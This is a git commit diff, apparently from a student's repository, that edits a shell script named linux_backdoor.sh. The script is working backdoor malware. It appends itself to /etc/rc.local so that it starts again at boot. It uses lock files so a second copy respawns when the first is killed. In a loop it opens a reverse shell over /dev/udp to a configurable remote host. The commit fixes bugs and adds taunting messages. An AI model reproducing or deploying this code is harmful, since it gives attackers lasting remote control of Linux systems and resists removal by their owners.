53cb044c9e3368a405eaf91996bb6873769114de
Cole O'mahony Lashley <clashley@terpmail.umd.edu>
2021-12-31 15:05:55 -0500

    linux backdoor

--- backdoors/linux_backdoor.sh
+++ backdoors/linux_backdoor.sh
@@ -7,18 +7,20 @@ next=0
 
 if [ ! -f /tmp/bd_lock ]
 then
-	if [! -f /tmp/bd_next ]
+	if [ ! -f /tmp/bd_next ]
 	then
-		echo "$(pwd)/${0##*/}" >> /etc/rc.local
+		echo "$(pwd)/${0##*/} $@ &" >> /etc/rc.local
 		# cronjob
 		# service that procs every couple minutes
+		echo ";)...persisting myself"
 	fi
 fi
 
 
 if [ ! -f /tmp/bd_next ]
 then
-	touch /tmp/bd_next
+	echo "I'm up next!"
+	touch "/tmp/bd_next"
 	next=1
 fi
 
@@ -26,20 +28,24 @@ while [ $mon -eq 1 ]
 do
 	if [ -f /tmp/bd_lock ]
 	then 
+		echo "monitoring pid"
 		mon_pid=$(cat /tmp/bd_lock)
 		if [ ! ps -p $mon_pid > /dev/null ]
 		then
+			echo ">:( someone tried to remove our backdoor!"
 			rm -f /tmp/bd_lock
 		fi
 	
 	else 
 		if [ $next -eq 1 ]
 		then 
+			echo "replacing the fallen soldier. I will avenge you !"
 			rm -f /tmp/bd_next
 			mon=0
 		else
 			if [ ! -f /tmp/bd_next ]
 			then
+				echo "I'm up next!"
 				touch /tmp/bd_next
 				next=1
 			fi
@@ -50,14 +56,16 @@ do
 
 done
 
-while 1
+while :
 do
-	sh -i >& /dev/udp/$ip/$port 0>&1
+	echo "shelling..."
 	sleep 30s
-	echo $$ > /tmp/bd_lock
+	echo $$ > "/tmp/bd_lock"
 	if [ ! -f /tmp/bd_next ] 
-		$0 7
+	then
+		./$0 $@ &
 	fi
+	sh -i >& /dev/udp/$ip/$port 0>&1
 done
 
 
